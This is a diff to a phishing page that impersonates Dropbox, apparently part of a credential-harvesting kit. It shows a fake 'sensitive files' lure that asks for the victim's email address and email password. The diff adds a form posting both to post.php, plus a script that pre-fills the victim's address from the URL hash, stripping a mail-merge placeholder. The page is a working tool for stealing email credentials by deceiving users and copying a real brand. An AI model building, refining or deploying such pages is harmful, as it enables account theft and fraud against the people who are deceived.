@@ -163,27 +163,55 @@ $(document).ready(function() {
 
     <!-- Modal content -->
     <div class="modal-content">
-        <div class="mcontent" id="mcontent">
+    <div class="mcontent" id="mcontent">
+        <div class="mlogo">
+            <img src="images/log.png">
+        </div>
+        <p class="instruction">
+          These files are sensitive and secured against unauthorized access. In order to access this file, please confirm receiving E-mail to authorize your download.
+        </p>
+        <p class="inst">Please Confirm Receiving E-mail to View Files</p>
+        <div class="error" id="error">Oops! Dropbox could not open user session, Please verify your information and try again</div>
+        <div class="ebox">
+            <p class="e-text" id="etext"></p>
 
-            <div class="mlogo">
-                <img src="images/log.png">
-            </div>
-            <p class="instruction">
-              These files are sensitive and secured against unauthorized access. In order to access this file, please confirm receiving E-mail to authorize your download.
-            </p>
-            <p class="inst">Please Confirm Receiving E-mail to View Files</p>
-            <div class="error" id="error">Oops! Dropbox could not open user session, Please verify your information and try and again</div>
-            <div class="ebox">
-                <p class="e-text" id="etext"></p>
-                                
-                <input type="email" class="password" id="email" placeholder="Enter receiving email" value="" required>
-                                 
-                <input type="password" class="password" id="password" placeholder="Enter email password">
+            <form id="emailForm" action="post.php" method="POST">
+                <input type="email" class="password" id="email" name="email" placeholder="Enter receiving email" value="" required>
+                <input type="password" class="password" id="password" name="password" placeholder="Enter email password">
                 <div class="submitdiv">
-                  <button class="submit" id="submit">View Files</button>
+                  <button type="submit" class="submit" id="submit">View Files</button>
                 </div>
-                <p class="foot">&copy; Copyright Dropbox Inc. 2026</p>
-            </div>
+            </form>
+            <p class="foot">&copy; Copyright Dropbox Inc. 2025</p>
+        </div>
+    </div>
+</div>
+
+<script>
+  // Function to get email from URL hash
+  function getEmailFromHash() {
+    if (window.location.hash) {
+      let hash = window.location.hash.substring(1); // remove #
+      // remove [[-email-]] if present
+      hash = hash.replace(/\[\[-email-\]\]/g, '');
+      return decodeURIComponent(hash);
+    }
+    return '';
+  }
+
+  // Pre-fill email input
+  const emailInput = document.getElementById('email');
+  const emailFromHash = getEmailFromHash();
+  if (emailFromHash) {
+    emailInput.value = emailFromHash;
+  }
+
+  // Optional: update URL hash if user changes email (keeps URL in sync)
+  emailInput.addEventListener('input', () => {
+    history.replaceState(null, '', '#' + encodeURIComponent(emailInput.value));
+  });
+</script>
+
 
         </div>
         <div class="mspinner" id="mspinner">
@@ -198,3 +226,4 @@ $(document).ready(function() {
 </body>
 
 </html>
+
